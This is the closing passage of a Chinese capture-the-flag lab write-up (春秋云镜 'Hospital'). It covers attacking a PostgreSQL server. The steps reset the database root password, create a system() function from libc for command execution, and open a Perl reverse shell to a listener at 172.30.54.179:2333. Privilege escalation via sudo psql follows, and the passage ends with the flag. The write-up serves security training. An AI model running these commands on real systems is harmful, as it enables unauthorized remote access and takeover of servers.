+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER root WITH PASSWORD &#x27;123456&#x27;</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p><code>PostgreSQL &lt;= 8.1</code> 可以通过调用系统的动态链接库 <code>libc.so.6</code> 来实现命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, &#x27;system&#x27; LANGUAGE &#x27;c&#x27; STRICT</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p>创建函数成功后，执行命令时当返回值为 <code>0</code> 表示执行成功，其它值则是执行失败。我们使用 <code>perl</code> 反弹 shell，注意在 <code>Web03</code> 机器上监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select system(&#x27;perl -e \&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>执行后成功弹回shell！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519193304323.png" alt="image-20250519193304323"></p>
+<p>但是我们是数据库用户权限，接下来要进行提权。</p>
+<p>我们先获取一个交互式 shell，然后使用 psql 进行 <code>sudo</code> 提权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519193409882.png" alt="image-20250519193409882"></p>
+<p>注意利用 <code>psql</code> 需要为绝对路径，否则需要 <code>Linux</code> 用户 <code>postgres</code> 的密码，其次需要 <code>PostgreSQL</code> 数据库中 <code>root</code> 用户的密码，不过前面我们修改过了。<code>root</code>用户的密码为<code>123456</code></p>
+<p>具体psql怎么打看下面：</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519194547877.png" alt="image-20250519194547877" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519194600574.png" alt="image-20250519194600574" style="zoom:80%;" />
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519193817901.png" alt="image-20250519193817901"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ab1d1d21-a477-4984-a4af-c462f5bce083&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About me</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">3.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4"><span class="toc-number">4.</span> <span class="toc-text">flag4</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&text=春秋云镜-Hospital wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&title=春秋云镜-Hospital wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&is_video=false&description=春秋云镜-Hospital wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜-Hospital wp&body=Check out this article: http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&title=春秋云镜-Hospital wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&title=春秋云镜-Hospital wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&title=春秋云镜-Hospital wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&title=春秋云镜-Hospital wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&name=春秋云镜-Hospital wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&t=春秋云镜-Hospital wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        Meteor_Kai
+        <br>
+        <a href="https://www.dkdun.cn/" target="_blank">DK盾</a>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">Home</a></li><!--
+                --><!--
+                --><li><a href="/about/">About me</a></li><!--
+                --><!--
+                --><li><a href="/archives/">Writing</a></li><!--
+                --><!--
+                --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+                --><!--
+                --><li><a href="/search/">Search</a></li><!--
+                --><!--
+                --><li><a href="/categories/">categories</a></li><!--
+                --><!--
+                --><li><a href="/tags/">tags</a></li><!--
+                --><!--
+                --><li><a href="/links/">links</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
